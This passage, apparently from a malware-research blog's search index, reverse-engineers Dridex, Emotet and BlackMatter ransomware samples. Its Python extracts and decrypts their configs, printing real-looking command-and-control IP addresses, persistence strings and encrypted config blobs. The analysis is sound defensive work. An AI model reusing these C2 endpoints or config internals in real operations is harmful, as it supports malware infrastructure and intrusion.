x0e x12 x08 x00 x13 t x00 x16 x08 x00 x17 t x00+ t x00 xae xff x07 xb2 xff x00 xb4 xff x00 xb5 xff x00 xc3 x01 x00 xc7 xff xbf xe7 x08 x00 xf0 x02 x00&#39; . 516 . C2 Networking . print(&quot;%d.%d.%d.%d&quot; % (0x67, 0x2a, 0x38, 0x0f)) . 103.42.56.15 . import re import pefile import struct # Change to be your own local file path SAMPLE_FILE_PATH = &#39;/tmp/dridex.bin&#39; file_data = open(SAMPLE_FILE_PATH, &#39;rb&#39;).read() ip_parse_egg = rb&#39; xbb(....) x89 x45 x00 x0f xb7 x53 x04 x89 x10 x0f xb6 x4b x0b x83 xf9 x0a&#39; pe = pefile.PE(data=file_data) data_section = None for s in pe.sections: if s.Name == b&#39;.data x00 x00 x00&#39;: data_section = s.get_data() match = re.search(ip_parse_egg, file_data, re.DOTALL|re.MULTILINE) ip_table_addr = None if match: table_addr = struct.unpack(&#39;&lt;I&#39;,match.group(1))[0] print(&quot;Found data table at: %s n&quot; % hex(table_addr)) # Turn address into rva/offset and calculate table offsets table_offset = pe.get_offset_from_rva(table_addr - pe.OPTIONAL_HEADER.ImageBase) ip_table_offset = table_offset + 0xb version_table_offset = table_offset + 4 # Get bot version bot_version = struct.unpack(&#39;&lt;H&#39;, file_data[version_table_offset:version_table_offset+2])[0] print(&quot;Bot Version: %d n&quot; % bot_version) ip_table_len = ord(file_data[ip_table_offset:ip_table_offset+1]) print(&quot;IP table length: %d&quot; % ip_table_len) # Move to actual IP table start ip_table_offset += 1 # Extract the c2 ips c2_ips = [] for i in range(ip_table_len): ip_string = &quot;%d.%d.%d.%d&quot; % (ord(file_data[ip_table_offset:ip_table_offset+1]), ord(file_data[ip_table_offset+1:ip_table_offset+2]), ord(file_data[ip_table_offset+2:ip_table_offset+3]), ord(file_data[ip_table_offset+3:ip_table_offset+4])) port_string = struct.unpack(&#39;&lt;H&#39;, file_data[ip_table_offset+4:ip_table_offset+6])[0] print(&quot;%s:%s&quot; % (ip_string,port_string)) c2_ips.append(&quot;%s:%s&quot; % (ip_string,port_string)) ip_table_offset += 6 . Found data table at: 0x55d020 Bot Version: 22201 IP table length: 3 103.42.56.15:443 169.255.57.61:8116 128.199.192.135:6602 .",
            "url": "https://research.openanalysis.net/dridex/doppeldridex/malware/config/2021/11/30/dridex_loader.html",
            "relUrl": "/dridex/doppeldridex/malware/config/2021/11/30/dridex_loader.html",
            "date": " • Nov 30, 2021"
        }
        
    
  
    
        ,"post10": {
            "title": "Emotet Config Extractor",
            "content": "Overview . Sample: c7574aac7583a5bdc446f813b8e347a768a9f4af858404371eae82ad2d136a01 . Unpacked: eeb13cd51faa7c23d9a40241d03beb239626fbf3efe1dbbfa3994fc10dea0827 . References: . Malshare Sample (Unpacked) | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Load The Sample . import struct import pefile EMOTET_FILE = r&#39;/tmp/emotet3.bin&#39; data = open(EMOTET_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) . txt_data = None for s in pe.sections: if b&#39;.text&#39; in s.Name: txt_data = s.get_data() print(txt_data[:100]) . b&#39; x03 xf2y x1a x0e xf2y x1aF xb1:JV xb05S@ xb05UA x90 x13 xa3 x91 x9f&amp; xccr xbf xa6 x021 x91H xa5= x96 x07 x00 x00 x00 x00 x00 x00 x00 x00&lt;n xbf x19 n xbf x19q x07 xdckS x1d xd0 x7fHN xefkU x03 xd6mU x18 xda9l x1c xd0oU n xdak,Gd&gt; xc0I xbd x9a x9d&gt;( xc2g xd3 x03 xdb&#39; . Decrypt Strings Table . def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(s): return all(c &lt; 128 for c in s) strings_table = [] ECS1_string = None ECK1_string = None for i in range(0,0x1000,4): candidate_1 = struct.unpack(&#39;&lt;I&#39;,txt_data[i:i+4])[0] candidate_2 = struct.unpack(&#39;&lt;I&#39;,txt_data[i+4:i+8])[0] if (candidate_1 &amp; 0xffffff00) ^ (candidate_2 &amp; 0xffffff00) == 0: # We have a match! key = txt_data[i:i+4] data_len = candidate_1 ^ candidate_2 enc_data = txt_data[i+8:i+8+data_len] ptxt_data = xor_decrypt(enc_data, key) if is_ascii(ptxt_data): if ptxt_data != b&#39;&#39;: strings_table.append(ptxt_data.decode(&#39;latin1&#39;)) if b&#39;ECS1&#39; == ptxt_data[:4]: ECS1_string = ptxt_data if b&#39;ECK1&#39; == ptxt_data[:4]: ECK1_string = ptxt_data # Print our strings print(ECS1_string) print(ECK1_string) for s in strings_table: print(s) . b&#34;ECS1 x00 x00 x00 xf4/ x1a x836 x1a&#39;Q x8c$ xf2 xca xa8 xec x85 xaeRYQuH x94 x06p x02s xaa xe8 x9a xc4({V t x0f xbc x08{ x80!z xa6(~ x96E xb9 xc3 xc3 &amp;t xcf xd8 xbe xa2 x85 x1f~ xa7 xa8- x954&#34; b&#39;ECK1 x00 x00 x00 xd85 x93 xd7c x8bP xc5 xdf xcd xe1i xf9 xb16 x00 x9b x9bT; x166 xa2]D. xb280 xd8G6. xb8 xd2 xf4 x8bj xc8 xd8LzED x1a x06 xfa x8f8 xbe xda xfb x00 x96 x9c x84, xce x1e6 x80$P x96&#39; ECCPUBLICBLOB Microsoft Primitive Provider SHA256 ObjectLength ECDSA_P256 HASH AES ECDH_P256 KeyDataBlob %s %s %s * %s:Zone.Identifier %s %s.exe Cookie: %s=%s --%S-- %u.%u.%u.%u Content-Type: multipart/form-data; boundary=%s --%S Content-Disposition: form-data; name=&#34;%S&#34;; filename=&#34;%S&#34; Content-Type: application/octet-stream %s %s %s rundll32.exe &#34;%s %s&#34;,%s SOFTWARE Microsoft Windows CurrentVersion Run Control_RunDLL %s %s%x %s rundll32.exe &#34;%s %s&#34;,%s %s %s rundll32.exe &#34;%s&#34;,Control_RunDLL POST userenv.dll shell32.dll bcrypt.dll crypt32.dll wtsapi32.dll urlmon.dll shlwapi.dll wininet.dll advapi32.dll %s_%08X %s%s.dll %s%s.exe DllRegisterServer %s regsvr32.exe -s &#34;%s&#34; %s rundll32.exe &#34;%s&#34;,Control_RunDLL %s %s rundll32.exe &#34;%s&#34;,Control_RunDLL WinSta0 Default RNG . Elliptic Curve Keys . References: . https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptimportkeypair | https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_ecckey_blob | https://github.com/tpn/winsdk-10/blob/master/Include/10.0.14393.0/shared/bcrypt.h | https://pycryptodome.readthedocs.io/en/latest/src/public_key/ecc.html | . print(ECS1_string) print(ECK1_string) # Extract ECS1 key ECS1_key_len = struct.unpack(&#39;&lt;I&#39;,ECS1_string[4:8])[0] ECS1_x = int.from_bytes(ECS1_string[8:8+ECS1_key_len], &quot;big&quot;) ECS1_y = int.from_bytes(ECS1_string[8+ECS1_key_len:], &quot;big&quot;) from Crypto.PublicKey import ECC ECS1_key = ECC.construct(curve=&quot;p256&quot;, point_x=ECS1_x, point_y=ECS1_y) print(&quot; nECS1 Key&quot;) print(ECS1_key.export_key(format=&quot;PEM&quot;)) # Extract ECK1 key ECK1_key_len = struct.unpack(&#39;&lt;I&#39;,ECK1_string[4:8])[0] ECK1_x = int.from_bytes(ECK1_string[8:8+ECK1_key_len], &quot;big&quot;) ECK1_y = int.from_bytes(ECK1_string[8+ECK1_key_len:], &quot;big&quot;) from Crypto.PublicKey import ECC ECK1_key = ECC.construct(curve=&quot;p256&quot;, point_x=ECK1_x, point_y=ECK1_y) print(&quot; nECK1 Key&quot;) print(ECK1_key.export_key(format=&quot;PEM&quot;)) . b&#34;ECS1 x00 x00 x00 xf4/ x1a x836 x1a&#39;Q x8c$ xf2 xca xa8 xec x85 xaeRYQuH x94 x06p x02s xaa xe8 x9a xc4({V t x0f xbc x08{ x80!z xa6(~ x96E xb9 xc3 xc3 &amp;t xcf xd8 xbe xa2 x85 x1f~ xa7 xa8- x954&#34; b&#39;ECK1 x00 x00 x00 xd85 x93 xd7c x8bP xc5 xdf xcd xe1i xf9 xb16 x00 x9b x9bT; x166 xa2]D. xb280 xd8G6. xb8 xd2 xf4 x8bj xc8 xd8LzED x1a x06 xfa x8f8 xbe xda xfb x00 x96 x9c x84, xce x1e6 x80$P x96&#39; ECS1 Key --BEGIN PUBLIC KEY-- MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE9C8agzYaJ1GMJPLKqOyFrlJZUXVI lAZwAnOq6JrEKHtWCQ+8CHuAIXqmKH6WRbnDw1wmdM/YvqKFH36nqC2VNA== --END PUBLIC KEY-- ECK1 Key --BEGIN PUBLIC KEY-- MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE2DWT12OLUMXfzeFp+bE2AJubVDsW NqJdRC6yODDYRzYuuNL0i2rI2Ex6RUQaBvqPOL7a+wCWnIQszh42gCRQlg== --END PUBLIC KEY-- . C2 Ground Truth . 81.0.236.93:443 . data_data = None for s in pe.sections: if b&#39;.data&#39; in s.Name: data_data = s.get_data() print(data_data[:100]) key = data_data[:4] data_len = struct.unpack(&#39;&lt;I&#39;,data_data[:4])[0] ^ struct.unpack(&#39;&lt;I&#39;,data_data[4:8])[0] enc_data = data_data[8:8+data_len] ptxt_data = xor_decrypt(enc_data, key) print(tohex(ptxt_data)) print(&quot; n== C2 List== &quot;) for i in range(0,len(ptxt_data),8): print(&quot;%d.%d.%d.%d:%d&quot; % (ptxt_data[i+0],ptxt_data[i+1],ptxt_data[i+2],ptxt_data[i+3],struct.unpack(&#39;&gt;H&#39;,ptxt_data[i+4:i+6])[0])) . b&#39;5 x84 xe9? x95 x84 xe9? x066 xd4 x034? xe9&gt; x9dA x1315 xd4 xe9&gt; x18 xcb xc8 x0f* x14 xe9&gt; xf1 xa8 x8b x81* x14 xe9&gt; x84 xcc xb91., xe9&gt; x06V x1b xd5* x14 xe9&gt; x8c x10@5* x14 xe9&gt; xbb x802 x92* x14 xe9&gt;{ xab%o4? xe9&gt;{ xaa xa0B4? xe9&gt; x10 xa8 x1d x8e* x14 xe9&gt; x10 xbf8 xb2&#39; b&#39;33b23d3c01bb0001a8c5fa0e005000012d4f21301f900001c42c62be1f900001b148500e1ba8000133d2f2ea1f900001b994a90a1f9000018e04dbad1f9000014e2fcc5001bb00014e2e497d01bb0001252cf4b11f900001253bd18d1f900001bffc6710005000013626f2b901bb000155d643cb1f9000013625e47a01bb0001cf9451771f900001c34def271f900001422a399501bb0001c39a922301bb0001&#39; == C2 List== 51.178.61.60:443 168.197.250.14:80 45.79.33.48:8080 196.44.98.190:8080 177.72.80.14:7080 51.210.242.234:8080 185.148.169.10:8080 142.4.219.173:8080 78.47.204.80:443 78.46.73.125:443 37.44.244.177:8080 37.59.209.141:8080 191.252.103.16:80 54.38.242.185:443 85.214.67.203:8080 54.37.228.122:443 207.148.81.119:8080 195.77.239.39:8080 66.42.57.149:443 195.154.146.35:443 .",
            "url": "https://research.openanalysis.net/emotet/malware/config/2021/11/18/emotet.html",
            "relUrl": "/emotet/malware/config/2021/11/18/emotet.html",
            "date": " • Nov 18, 2021"
        }
        
    
  
    
        ,"post11": {
            "title": "BlackMatter Ransomware Version 3",
            "content": "Overview . Sample: 9BAE897C19F237C22B6BDC024DF27455E739BE24BED07EF0D409F2DF87EEDA58 . References: . Malshare Sample | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Config Decryption . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Extract Config . The Blackmatter config is stored in the PE resource section .rsrc. . The first QWORD of the resource is the seed for an lcg. . Following is a DWORD is the size of the encrypted config and is followed by the encrypted config data. . import struct import pefile RANSOMWARE_FILE = r&#39;/tmp/blackmatter_v3.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) # Get resource data r_data = None for s in pe.sections: if b&#39;rsrc&#39; in s.Name: r_data = s.get_data() print(&quot;Resource data length: %s&quot; % hex(len(r_data))) # Parse data from resource seed = struct.unpack(&#39;&lt;Q&#39;,r_data[:8])[0] data_size = struct.unpack(&#39;&lt;I&#39;,r_data[8:12])[0] enc_data = r_data[12:] print(&quot;Seed: %s&quot; % hex(seed)) print(&quot;Size: %s&quot; % hex(data_size)) print(&quot;Encrypted data example: %s...&quot; % tohex(enc_data[:20])) . Resource data length: 0xe00 Seed: 0x910fde2951947bbf Size: 0xdbe Encrypted data example: b&#39;4f4c8b8161b0c98217024cce8d9e7a0a4864ab36&#39;... . Decryption Routine . This PRNG algorithim is injected into memory at runtime -- maybe an attempt to hide the algorithm from statica analysis? Not a very good attempt though.... . __int64 __stdcall sub_B45133(_DWORD *a1, _DWORD *a2) { __int64 v2; // rax v2 = ((__int64 (__stdcall *)(_DWORD, _DWORD, int, int))sub_B450FD)(*a2, a2[1], 0x4C957F2D, 0x5851F42D) + 0x14057B7EF767814F; *(_QWORD *)a2 = v2; return ((__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_B450FD)(*a1, a1[1], v2, HIDWORD(v2)); } . eax = 0x00a5f770 edx = 0x910fde29 . import struct def gen_key(seed, key_length): out = b&#39;&#39; tmp_seed = seed for i in range(key_length): tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF out += struct.pack(&#39;&lt;Q&#39;,(tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF) return out tmp_seed = seed tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF print(&quot;Test temp seed: %s&quot; % hex(tmp_seed)) print(&quot;Test xor key: %s&quot; % hex((tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF)) #E2 02 10 B2 F6 64 C5 B1 print(&quot;Real Temp seed: %s n n&quot; % hex(struct.unpack(&#39;&lt;Q&#39;,unhex(&#39;E2 02 10 B2 F6 64 C5 B1&#39;.replace(&#39; &#39;,&#39;&#39;)))[0])) # 09 21 30 FB 18 EB 52 6A print(&quot;Real Temp seed 2: %s&quot; % hex(struct.unpack(&#39;&lt;Q&#39;,unhex(&#39;09 21 30 FB 18 EB 52 6A&#39;.replace(&#39; &#39;,&#39;&#39;)))[0])) # FC9FF30B7AFBF8B7 tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF print(&quot;Test temp seed 2: %s&quot; % hex(tmp_seed)) print(&quot;Test xor key 2: %s&quot; % hex((tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF)) key_data = gen_key(seed, data_size) print(&quot;key: %s&quot; % tohex(key_data[:32])) print(&quot;data: %s&quot; % tohex(enc_data[:32])) # buff[0] ^ lo_al = 9e ^ 4f = d1 # buff[1] ^ lo_dh = 4c ^ 4f = 03 # buff[2] ^ lo_ah = bc ^ 8b = 37 # buff[3] ^ lo_dl = f9 ^ 81 = 78 # buff[4] ^ hi_al = fc ^ 61 = 9d for i in range(0,10,8): print(hex(enc_data[i] ^ key_data[i])) print(hex(enc_data[i+1] ^ key_data[i+5])) print(hex(enc_data[i+2] ^ key_data[i+1])) print(hex(enc_data[i+3] ^ key_data[i+4])) print(hex(enc_data[i+4] ^ key_data[i+2])) print(hex(enc_data[i+5] ^ key_data[i+7])) print(hex(enc_data[i+6] ^ key_data[i+3])) print(hex(enc_data[i+7] ^ key_data[i+6])) print(&quot; n n&quot;) . Test temp seed: 0xb1c564f6b21002e2 Test xor key: 0x7b0d4ff9b7fcbc9e Real Temp seed: 0xb1c564f6b21002e2 Real Temp seed 2: 0x6a52eb18fb302109 Test temp seed 2: 0x6a52eb18fb302109 Test xor key 2: 0xfc9ff30b7afbf8b7 key: b&#39;9ebcfcb7f94f0d7bb7f8fb7a0bf39ffc1cf036c7b11595d9dd871868434d676f&#39; data: b&#39;4f4c8b8161b0c98217024cce8d9e7a0a4864ab36c6254e94751162b199b5d58b&#39; 0xd1 0x3 0x37 0x78 0x9d 0xcb 0x7e 0x8f 0xa0 0xf1 0xb4 0xc5 0x76 0x62 0x0 0x95 . def decrypt(enc_data, data_size, seed): out = [] keystream = gen_key(seed, data_size) for i in range(0,data_size-8,8): out.append(enc_data[i] ^ key_data[i]) out.append(enc_data[i+1] ^ key_data[i+5]) out.append(enc_data[i+2] ^ key_data[i+1]) out.append(enc_data[i+3] ^ key_data[i+4]) out.append(enc_data[i+4] ^ key_data[i+2]) out.append(enc_data[i+5] ^ key_data[i+7]) out.append(enc_data[i+6] ^ key_data[i+3]) out.append(enc_data[i+7] ^ key_data[i+6]) return bytes(out) ap_data = decrypt(enc_data, data_size, seed) ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#39; xd17x x9d xcb~ x8f x9d xf1 xb4 xc5b x8f x95Tq[ x87 xf0 xfc x89 xa8 xe5 xf2 x81 xda xbd x87 x17g xd8 xb2 x97 x92 jS x1dp xf53`Ei xc7 x88 xfb xdab:5 x8a xcb xf0 x186 x15 x98 xe4l} xa3 xe5 xd3V{bY&#34; x969 xc3 x01f3 x13t~ x0cuu xe5 xd6 x1aGu x9ff x00 xbd x8emFU x99Zga x95 x08w xd4 x9d r xe0 x8e xe3 x06 / xaa x14 xcd xffR x01 x81 xd7 xea x00 xf0 x7f xc9 x87 x88iNY x1a1 T xe8 x80 r xaeqC U_ xa5 xb9 xa7{ xca^(^ x06 xd5 t xae&#34; x93 xa4X&gt; x00 x01 x01 x01 x01 x01 x01 x01 x01, x00 x00 x00 xa9 x00 x00 x00 xea x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfb x01 x00 x00 xd0 x04 x00 x00] x05 x00 x00 xd6 x05 x00 x00 &#39; x07 x00 x00 xa5 xc8 xe6 x8fro4BrnX5Zms1fmgmp9Hypi0hCgPduMrclWUIq05OADb1eHAmezreXJI46rfXbELjszc67ztiIrrUJUtMlON1LsA7puHNgfKMOAvLUpTmZlNYac7GNXnwBwAAAAA= x00UqLSghWqzIY3WZfbVqvI/NH3zsibCQc59aY6wgDsa4SWrgzwNariy+RXqoUAAAAA x00k8UWrwAbmN9xl+JkwBxI3YAbWNsAHijNQBgQycAYkOlAGKDHgBywywAdgOfAHIDdgBww48AcGN3AGHjVQBnI2cAYwOHxlLpKMZbiSgAZEOMAHMDxABuA04CrnsnAG2jnABtgy9u3a0rAGyDdwByI4cAYmNUAHQjTQBpwx0AbIMmAG0jFAA6wZ8DYXuFAHZDJABnA1UAemOnAG2jJ/sv8oQAamOkAGTDbepsuzQAcCN03eMpMABxg6QAcYMkAGbDFwBhg1cAcqN0AAAAA x00ZQBuAGMAcwB2AGMAAAB0AGgAZQBiAGEAdAAAAG0AeQBkAGUAcwBrAHQAbwBwAHEAbwBzAAAAeABmAHMAcwB2AGMAYwBvAG4AAABmAGkAcgBlAGYAbwB4AAAAaQBuAGYAbwBwAGEAdABoAAAAdwBpAG4AdwBvAHIAZAAAAHMAdABlAGEAbQAAAHMAeQBuAGMAdABpAG0AZQAAAG4AbwB0AGUAcABhAGQAAABvAGMAbwBtAG0AAABvAG4AZQBuAG8AdABlAAAAbQBzAHAAdQBiAAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAYQBnAG4AdABzAHYAYwAAAHMAcQBsAAAAZQB4AGMAZQBsAAAAcABvAHcAZQByAHAAbgB0AAAAbwB1AHQAbABvAG8AawAAAHcAbwByAGQAcABhAGQAAABkAGIAZQBuAGcANQAwAAAAaQBzAHEAbABwAGwAdQBzAHMAdgBjAAAAcwBxAGIAYwBvAHIAZQBzAGUAcgB2AGkAYwBlAAAAbwByAGEAYwBsAGUAAABvAGMAYQB1AHQAbwB1AHAAZABzAAAAZABiAHMAbgBtAHAAAABtAHMAYQBjAGMAZQBzAHMAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABvAGMAcwBzAGQAAABtAHkAZABlAHMAawB0AG8AcABzAGUAcgB2AGkAYwBlAAAAdgBpAHMAaQBvAAAAAAA= x00bQBlAHAAbwBjAHMAAABtAGUAbQB0AGEAcwAAAHYAZQBlAGEAbQAAAHMAdgBjACQAAABiAGEAYwBrAHUAcAAAAHMAcQBsAAAAdgBzAHMAAABtAHMAZQB4AGMAaABhAG4AZwBlAAAAAAC= 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&#39; . import base64 ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 9 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c)) def is_ascii(s): return all(c &lt; 128 for c in s) print(&quot;RSA: %r n&quot; % rsa_data) print(&quot;Affiliate ID: %r n&quot; % affiliate_id_data) print(&quot;Flags: %s n&quot; % tohex(config_flags)) for c in config_values: if not is_ascii(c): c = new_data = decrypt(c,len(c), seed) print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c.split(b&#39; x00 x00&#39;)])) . RSA: b&#39; xd17x x9d xcb~ x8f x9d xf1 xb4 xc5b x8f x95Tq[ x87 xf0 xfc x89 xa8 xe5 xf2 x81 xda xbd x87 x17g xd8 xb2 x97 x92 jS x1dp xf53`Ei xc7 x88 xfb xdab:5 x8a xcb xf0 x186 x15 x98 xe4l} xa3 xe5 xd3V{bY&#34; x969 xc3 x01f3 x13t~ x0cuu xe5 xd6 x1aGu x9ff x00 xbd x8emFU x99Zga x95 x08w xd4 x9d r xe0 x8e xe3 x06 / xaa x14 xcd xffR x01 x81 xd7 xea x00 xf0 x7f xc9 x87 x88i&#39; Affiliate ID: b&#39;NY x1a1 T xe8 x80 r xaeqC U_ xa5 xb9 xa7{ xca^(^ x06 xd5 t xae&#34; x93 xa4X&gt;&#39; 